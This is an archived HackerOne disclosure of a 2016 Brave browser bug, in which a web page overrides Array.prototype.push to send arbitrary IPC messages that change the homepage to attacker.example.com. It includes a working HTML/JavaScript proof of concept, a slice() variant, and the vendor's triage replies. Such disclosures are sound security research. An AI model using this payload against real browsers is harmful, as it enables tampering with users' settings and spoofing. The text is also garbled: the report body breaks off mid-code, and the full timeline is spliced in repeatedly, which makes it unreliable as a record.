---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - vuln/xss
substate: "informative"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2018-09-18
submitted: 2016-12-06T01:43:30.507Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/brave|Brave Software]]"
reporter: "masatokinugawa"
source: "https://hackerone.com/reports/188561"
title: "Sending arbitrary IPC messages via overriding Array.prototype.push"
---
# Sending arbitrary IPC messages via overriding Array.prototype.push

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 6 | **Program:** Brave Software | **Disclosed:** 2018-09-18

- Report: [https://hackerone.com/reports/188561](https://hackerone.com/reports/188561)
- CWE: Command Injection - Generic
- Submitted: 2016-12-06T01:43:30.507Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
This bug is similar to #187542 and #188086.
I found that also `Array.prototype.push` is exploitable.

## Tested on: 
Brave	0.12.12

## Steps To Reproduce:
1. Go to this page: https://vulnerabledoma.in/brave/settings_change3.html 
```
<script>
Array.prototype.push=function(e){
	this[0]=function(e,f){
		e.sender.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
	}
}
</script>

<embed src=".swf"></embed>
```

2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.

Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .

#Technical Details

This `push` in the `event_emitter.js` is overwritten: 
```
EventEmitter2.prototype.on = function (event, fn) {
  this._callbacks = this._callbacks || {};
  (this._callbacks['

- **Report Filed**
- **2016-12-06** @masatokinugawa: Oops, the style is broken. Sorry :(
- **2016-12-06** @masatokinugawa: I'd like to post the readable version just in case:
## Summary:
This bug is similar to #187542 and #188086.
I found that also `Array.prototype.push` is exploitable.

## Tested on: 
Brave	0.12.12

## Steps To Reproduce:
1. Go to this page: https://vulnerabledoma.in/brave/settings_change3.html

```
<script>
Array.prototype.push=function(e){
	this[0]=function(e,f){
		e.sender.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
	}
}
</script>

<embed src=".swf"></embed>
```

2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.

Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .

#Technical Details

This `push` in the `event_emitter.js` is overwritten: 
```
EventEmitter2.prototype.on = function (event, fn) {
  this._callbacks = this._callbacks || {};
  (this._callbacks['$' + event] = this._callbacks['$' + event] || [])
    .push(fn);
  return this;
};
```

Could you confirm this bug?
Thanks!
- **2016-12-06** @masatokinugawa: also it seems it's exploitable via `Array.prototype.slice`.
https://vulnerabledoma.in/brave/settings_change4.html

The affected code is:
```
EventEmitter2.prototype.emit = function(event) {
  this._callbacks = this._callbacks || {};
  var args = $Array.slice(arguments, 1), callbacks = this._callbacks['$' + event];

  if (callbacks) {
    callbacks = callbacks.slice(0);////////////////////////HERE
    for (var i = 0, len = callbacks.length; i < len; ++i) {
      $Function.apply(callbacks[i], this, args);
    }
  }

  return this;
};
```
- **Report Triaged**
- **2016-12-06** @brave_dev: thanks for the report, but this issue is covered in https://github.com/brave/electron/issues/109
There is a potentially endless stream of these types of exploits and fixing them "whack-a-mole" style is not a good security strategy. A fix is already in progress for the issue in github.
- **2016-12-06** @masatokinugawa: I think affected internal code in the Brave Browsers are only three small files so far -- `event_emitter.js`, `ipc.js` and `ipc_utils.js`. So I think it's not so difficult to do the workaround for all overwritable methods before implementing the isolated world if it's exploitable or not. But if you can implement the isolated world quickly, of course you don't have to do that though
- **Report Informative**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
 + event] = this._callbacks['

- **Report Filed**
- **2016-12-06** @masatokinugawa: Oops, the style is broken. Sorry :(
- **2016-12-06** @masatokinugawa: I'd like to post the readable version just in case:
## Summary:
This bug is similar to #187542 and #188086.
I found that also `Array.prototype.push` is exploitable.

## Tested on: 
Brave	0.12.12

## Steps To Reproduce:
1. Go to this page: https://vulnerabledoma.in/brave/settings_change3.html

```
<script>
Array.prototype.push=function(e){
	this[0]=function(e,f){
		e.sender.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
	}
}
</script>

<embed src=".swf"></embed>
```

2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.

Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .

#Technical Details

This `push` in the `event_emitter.js` is overwritten: 
```
EventEmitter2.prototype.on = function (event, fn) {
  this._callbacks = this._callbacks || {};
  (this._callbacks['$' + event] = this._callbacks['$' + event] || [])
    .push(fn);
  return this;
};
```

Could you confirm this bug?
Thanks!
- **2016-12-06** @masatokinugawa: also it seems it's exploitable via `Array.prototype.slice`.
https://vulnerabledoma.in/brave/settings_change4.html

The affected code is:
```
EventEmitter2.prototype.emit = function(event) {
  this._callbacks = this._callbacks || {};
  var args = $Array.slice(arguments, 1), callbacks = this._callbacks['$' + event];

  if (callbacks) {
    callbacks = callbacks.slice(0);////////////////////////HERE
    for (var i = 0, len = callbacks.length; i < len; ++i) {
      $Function.apply(callbacks[i], this, args);
    }
  }

  return this;
};
```
- **Report Triaged**
- **2016-12-06** @brave_dev: thanks for the report, but this issue is covered in https://github.com/brave/electron/issues/109
There is a potentially endless stream of these types of exploits and fixing them "whack-a-mole" style is not a good security strategy. A fix is already in progress for the issue in github.
- **2016-12-06** @masatokinugawa: I think affected internal code in the Brave Browsers are only three small files so far -- `event_emitter.js`, `ipc.js` and `ipc_utils.js`. So I think it's not so difficult to do the workaround for all overwritable methods before implementing the isolated world if it's exploitable or not. But if you can implement the isolated world quickly, of course you don't have to do that though
- **Report Informative**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
 + event] || [])
    .push(fn);
  return this;
};
```

Could you confirm this bug?
Thanks!

## Timeline

- **Report Filed**
- **2016-12-06** @masatokinugawa: Oops, the style is broken. Sorry :(
- **2016-12-06** @masatokinugawa: I'd like to post the readable version just in case:
## Summary:
This bug is similar to #187542 and #188086.
I found that also `Array.prototype.push` is exploitable.

## Tested on: 
Brave	0.12.12

## Steps To Reproduce:
1. Go to this page: https://vulnerabledoma.in/brave/settings_change3.html

```
<script>
Array.prototype.push=function(e){
	this[0]=function(e,f){
		e.sender.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
	}
}
</script>

<embed src=".swf"></embed>
```

2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.

Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .

#Technical Details

This `push` in the `event_emitter.js` is overwritten: 
```
EventEmitter2.prototype.on = function (event, fn) {
  this._callbacks = this._callbacks || {};
  (this._callbacks['$' + event] = this._callbacks['$' + event] || [])
    .push(fn);
  return this;
};
```

Could you confirm this bug?
Thanks!
- **2016-12-06** @masatokinugawa: also it seems it's exploitable via `Array.prototype.slice`.
https://vulnerabledoma.in/brave/settings_change4.html

The affected code is:
```
EventEmitter2.prototype.emit = function(event) {
  this._callbacks = this._callbacks || {};
  var args = $Array.slice(arguments, 1), callbacks = this._callbacks['$' + event];

  if (callbacks) {
    callbacks = callbacks.slice(0);////////////////////////HERE
    for (var i = 0, len = callbacks.length; i < len; ++i) {
      $Function.apply(callbacks[i], this, args);
    }
  }

  return this;
};
```
- **Report Triaged**
- **2016-12-06** @brave_dev: thanks for the report, but this issue is covered in https://github.com/brave/electron/issues/109
There is a potentially endless stream of these types of exploits and fixing them "whack-a-mole" style is not a good security strategy. A fix is already in progress for the issue in github.
- **2016-12-06** @masatokinugawa: I think affected internal code in the Brave Browsers are only three small files so far -- `event_emitter.js`, `ipc.js` and `ipc_utils.js`. So I think it's not so difficult to do the workaround for all overwritable methods before implementing the isolated world if it's exploitable or not. But if you can implement the isolated world quickly, of course you don't have to do that though
- **Report Informative**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
